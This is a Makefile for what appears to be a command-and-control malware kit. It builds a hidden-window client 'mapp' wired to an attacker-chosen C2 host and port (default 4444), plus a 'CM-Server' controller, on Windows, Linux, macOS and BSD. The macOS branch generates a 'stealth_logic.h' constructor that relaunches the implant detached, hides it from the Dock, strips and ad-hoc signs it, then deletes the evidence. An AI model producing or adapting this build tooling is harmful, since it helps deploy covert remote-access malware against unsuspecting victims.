CC = gcc
C_SRC = main.c
S_SRC = server.c
C_TARGET = mapp
S_TARGET = CM-Server
BIN = $(C_TARGET)
SBIN = $(S_TARGET)
l = ""

.PHONY: all clean update

L = (
R = )


# 清除编译产物


define wininput
ifeq ($(C2_IP_DOMAIN),)
C2_IP_DOMAIN := $(shell cmd /v:on /c "$(L)set t=127.0.0.1$(R) $(I)& set /p t=IP or Domain$(L)127.0.0.1$(R): >con & echo.!t!")
endif

ifeq ($(C2_PORT),)
C2_PORT := $(shell cmd /v:on /c "$(L)set t=4444$(R) $(I)& set /p t=PORT$(L)4444$(R): >con & echo.!t!")
endif
endef


define uninput
ifeq ($(C2_IP_DOMAIN),)
C2_IP_DOMAIN := $(shell read -p "IP or Domain$(L)127.0.0.1$(R): " t; echo $${t:-127.0.0.1})
endif
ifeq ($(C2_PORT),)
C2_PORT :=$(shell read -p "PORT$(L)4444$(R): " t; echo $${t:-4444})
endif
endef


# 检查是否有 cl.exe，有则用 cl，没有则用 gcc
ifneq ($(findstring cl,$(shell where cl 2> .nn)),)
CC := cl
else
CC := gcc
endif

# 检查是否有 rm，有则用 rm，没有则用 cmd的erase
ifneq ($(findstring rm,$(shell where rm 2> .nn)),)
CLL := sh -c "rm -rf ./nn ./.nn"
else
CLL := cmd /c erase /f /q .\nn .\.nn
endif

all: $(C_SRC) $(S_SRC)
ifeq ($(OS),Windows_NT) # Windows

ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
	$(eval $(call wininput))
	@cmd /c erase /f /q .\.nn .\nn
	$(CC) $(C_SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib

	$(CC) $(S_SRC) /Fe:$(SBIN).exe /O1 /DNDEBUG /link ws2_32.lib
else
ifneq ($(findstring MINGW64_NT,$(shell uname -s))$(findstring MINGW32_NT,$(shell uname -s))$(findstring MSYS_NT,$(shell uname -s)),) # MSYS/MSYS2
	$(eval $(call uninput))
	@$(CLL)
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)

	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lws2_32
endif
ifeq ($(findstring Windows_NT,$(shell uname -s)),Windows_NT) # W32/64devkit
	$(eval $(call wininput))
	@cmd /c erase /f /q .\.nn .\nn
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)

	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lws2_32
endif
ifeq ($(findstring CYGWIN_NT,$(shell uname -s)),CYGWIN_NT) # Cygwin
	$(eval $(call wininput))
	@cmd /c erase /f /q .\.nn .\nn
	$(CC) $(C_SRC) -o $(BIN) -Os -s -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)

	$(CC) $(S_SRC) -o $(SBIN) -Os -s
endif
endif
endif

ifeq ($(shell uname -s),Linux) # Linux
	$(eval $(call uninput))
	@sh -c "rm -rf ./nn ./.nn"
ifneq ($(findstring w64-mingw32,$(CC)),) # Linux的mingw编译器
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)

	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lws2_32
else # 普通linux编译
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lpthread -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)

	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lpthread
endif
endif

ifeq ($(shell uname -s),Darwin) # macOS(Darwin)
	$(eval $(call uninput))
	@sh -c "rm -rf ./nn ./.nn"
ifneq ($(findstring w64-mingw32,$(CC)),) # macOS(Darwin)的mingw编译器
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)

	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lws2_32
else # 普通macOS(Darwin)编译
	@printf '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>LSUIElement</key><true/></dict></plist>' > temp.plist
	@printf '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <libgen.h>\n#include <mach-o/dyld.h>\n\
	__attribute__((constructor)) static void init() { \
		if (getenv("ST_ACT")) return; \
		char path[1024]; uint32_t size = sizeof(path); \
		if (_NSGetExecutablePath(path, &size) != 0) return; \
		chdir(dirname(path)); \
		setenv("ST_ACT", "1", 1); \
		char cmd[2048]; \
		sprintf(cmd, "nohup \\"%%s\\" > /dev/null 2>&1 & disown", path); \
		system(cmd); \
		exit(0); \
	}' > stealth_logic.h
	$(CC) $(C_SRC) -o $(BIN) -Os -include stealth_logic.h -Wl,-sectcreate,__TEXT,__info_plist,temp.plist -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)
	@rm -rf stealth_logic.h temp.plist
	@strip $(BIN) 2>/dev/null || true
	@codesign -s - --force $(BIN) 2>/dev/null || true

	$(CC) $(S_SRC) -o $(SBIN) -Os

	@rm -rf ./.DS_Store
endif 
endif

ifeq ($(findstring BSD,$(shell uname -s)),BSD) # BSD
	$(eval $(call uninput))
	@sh -c "rm -rf ./nn ./.nn"
ifeq ($(findstring FreeBSD,$(shell uname -s)),FreeBSD) # FreeBSD
ifneq ($(findstring w64-mingw32,$(CC)),) # FreeBSD的mingw编译器
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)
	
	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lws2_32
else # 普通FreeBSD编译
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lpthread -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)

	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lpthread
endif
endif
ifeq ($(findstring OpenBSD,$(shell uname -s)),OpenBSD) # OpenBSD
ifneq ($(findstring w64-mingw32,$(CC)),) # OpenBSD的mingw编译器
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)

	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lws2_32
else # 普通OpenBSD编译
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lpthread -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)

	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lpthread
endif
endif
ifeq ($(findstring NetBSD,$(shell uname -s)),NetBSD) # NetBSD
ifneq ($(findstring w64-mingw32,$(CC)),) # NetBSD的mingw编译器
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)

	$(CC) $(S_SRC) -o $(SBIN) -Os -s -lws2_32
else # 普通NetBSD编译
	$(CC) $(C_SRC) -o $(BIN) -Os -s -lpthread -DC2_IP_DOMAIN=\"$(C2_IP_DOMAIN)\" -DC2_PORT=$(C2_PORT)
endif
endif
endif


update:
ifeq ($(OS),Windows_NT)
ifneq ($(findstring MINGW64_NT,$(shell uname -s))$(findstring MINGW32_NT,$(shell uname -s))$(findstring MSYS_NT,$(shell uname -s)),) # MSYS/MSYS2 需要
	@sh -c "which git > /dev/null 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
	@sh -c "rm -rf ./nn ./.nn"
endif
	@# 检测有没有git
	@cmd /c "where git >nul 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
	@cmd /c erase /f /q .\.nn .\nn
else
	@# 检测有没有git
	@sh -c "which git > /dev/null 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
	@sh -c "rm -rf ./nn ./.nn"
endif


clean:
ifeq ($(OS),Windows_NT)
ifneq ($(findstring MINGW64_NT,$(shell uname -s))$(findstring MINGW32_NT,$(shell uname -s))$(findstring MSYS_NT,$(shell uname -s)),) # MSYS/MSYS2 需要
	@sh -c "rm -rf ./nn ./.nn"
	@sh -c "rm -rf $(BIN) $(BIN).* $(SBIN) $(SBIN).*"
endif
	@cmd /c erase /f /q .\.nn .\nn
	@cmd /c erase /f /q $(BIN) $(BIN).* $(SBIN) $(SBIN).*
else
	@sh -c "rm -rf ./nn ./.nn"
	@sh -c "rm -rf $(BIN) $(BIN).* $(SBIN) $(SBIN).*"
endif